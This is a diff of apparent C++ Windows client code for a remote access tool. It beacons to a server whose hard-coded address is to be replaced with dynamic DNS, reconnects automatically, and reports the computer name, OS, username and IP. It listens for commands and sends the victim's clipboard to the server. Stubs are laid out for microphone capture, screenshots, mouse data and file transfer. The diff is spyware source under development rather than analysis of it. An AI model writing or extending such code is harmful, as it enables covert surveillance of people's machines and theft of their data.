@@ -6,6 +6,8 @@
 
 #pragma comment(lib,"Ws2_32.lib")
 
+using namespace Packet;
+
 wsaWrapper::wsaWrapper() {
     res = WSAStartup(MAKEWORD(2, 2), &wsa);
     if (res != 0) {
@@ -52,9 +54,7 @@ std::string getIPv4(std::string dns) {
 
 
 
-namespace network {
-
-    int _connect(std::string dns, short PORT)
+int network::_connect(std::string dns, short PORT)
     {
         wsaWrapper wsa;
       //  SOCKET srvSocket = INVALID_SOCKET;
@@ -63,7 +63,7 @@ namespace network {
         ZeroMemory(&srvAddr, sizeof(srvAddr));
       
 
-   // reconnecting:
+    re_connecting:
             srvSOCKET = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
             if (srvSOCKET == SOCKET_ERROR)
             {
@@ -75,9 +75,10 @@ namespace network {
  
             srvAddr.sin_family = AF_INET;
             srvAddr.sin_port = htons(PORT);
-          //  srvAddr.sin_addr = inet_addr("127.0.0.1");
-
-            if (inet_pton(AF_INET, "127.0.0.1", &srvAddr.sin_addr) <= 0) {
+          
+            
+            if (inet_pton(AF_INET, "127.0.0.1", &srvAddr.sin_addr) <= 0) //static ip will be replaced with dynamic dns ex.: dns1.google.com 
+            {
                 printf(
                     "\nInvalid address/ Address not supported \n");
                 return -1;
@@ -89,79 +90,25 @@ namespace network {
                 if (ret == SOCKET_ERROR)
                 {
                     printf("ERR: %d\n", WSAGetLastError());
-                   // Sleep(RETRY_TIME); //reconnect in 5seconds see "common.h"
+                    Sleep(RETRY_TIME); //reconnect in 5seconds see "common.h"
                     closesocket(srvSOCKET);
-                   // goto reconnecting;
+                    goto re_connecting;
                 }
                 else {
                     printf("Connected");
 
                     //send machine specs/info on client connect
                     _sendHWSpecs();
+
+                    while (true)
+                    {
+                        Packet::recvPacket(srvSOCKET);
+                        //-> need to add threads to manage multiple tasks
+                    }
                 }
 
 
-            
-             
 
-               
-                char recvBuffer[RECV_BUFFERSIZE];
-                
-                while (true) {
-                // Packet data = recvPacket(srvSOCKET);
-                    ret = recv(srvSOCKET, recvBuffer, RECV_BUFFERSIZE, 0);
-                    if (ret > 0) {
-                        
-                        switch (*recvBuffer)
-                        {
-                        case /*Packet::Type::txt_data*/ 
-                        0x00:
-                            //
-                            break;
-                        case /*Packet::Type::clip_data*/ 
-                        0x01:
-                            _sendClipbord();
-                            break;
-                        case /*Packet::Type::hw_data*/ 
-                        0x02:
-                            _sendHWSpecs();
-                            break;
-                        case /*Packet::Type::snd_data*/ 
-                        0x03:
-                            //
-                            break;
-                        case /*Packet::Type::img_data*/ 
-                        0x04:
-                            //
-                            break;
-                        case /*Packet::Type::vid_data*/ 
-                        0x05:
-                            //
-                            break;
-                        case /*Packet::Type::mouse_data*/ 
-                        0x06:
-                            //
-                            break;
-                        case /*Packet::Type::ft_data*/ 
-                        0x07:
-                            //
-                            break;
-                        default:
-                            break;
-                        }
-            
-
-                    }
-                    else if (ret == 0)
-                    {
-                        //connection closed
-                    }
-                   // else
-                        //print error (WSAGetLastError());
-                 }
-
-           
-      
 
         
         //initialise wsa, setup client/srv details and CONNECT to IP/PORT
@@ -169,7 +116,7 @@ namespace network {
     }
 
 
-    int _sendClipbord() {
+int network::_sendClipbord(void) {
         
         HANDLE hndl;
         int iRet = 0;
@@ -179,31 +126,32 @@ namespace network {
            
 
              
+             
+            iRet = Packet::sendPacket((char*)hndl,Packet::Type::clip_data, srvSOCKET);
 
-            iRet = Packet::sendPacket((char*)hndl, Packet::Type::clip_data, srvSOCKET);
-
-            if (iRet != 0)
-                printf("Error sending clipboard Packet, Code: %d\n", WSAGetLastError());
+            if (iRet < 0)
+                return WSAGetLastError();
         }
           
         return 0;
     }
 
-    int _captureMic() {
+int network::_captureMic(void) {
         //captureMic see audio.h  FORMAT DATA WITH PROPPER HEADER see packet.h header and send to server... -> IP/PORT
         return 0;
     }
-    int _sendScrShot() {
+
+int network::_sendScrShot(void) {
         //take desktop screenshot FORMAT DATA WITH PROPPER HEADER see packet.h header and send to server... -> IP/PORT
         return 0;
     }
 
-    int _sendHWSpecs() {
+int network::_sendHWSpecs(void) {
         //get HW specs , FORMAT DATA WITH PROPPER HEADER see packet.h header and send to server... -> IP/PORT
         int iRet = 0;
         Client clientSpecs;
         std::string 
-        clSpecs =  "ComputerName: " + clientSpecs.computerName;
+        clSpecs =  "\nComputerName: " + clientSpecs.computerName;
         clSpecs += "\nComputerOS: " + clientSpecs.computerOS ;
         clSpecs += "\nUsername: " +clientSpecs.userName;
         clSpecs += "\nclient IP: " + clientSpecs.ip;
@@ -216,4 +164,4 @@ namespace network {
         return 0;
     }
 
-}
+
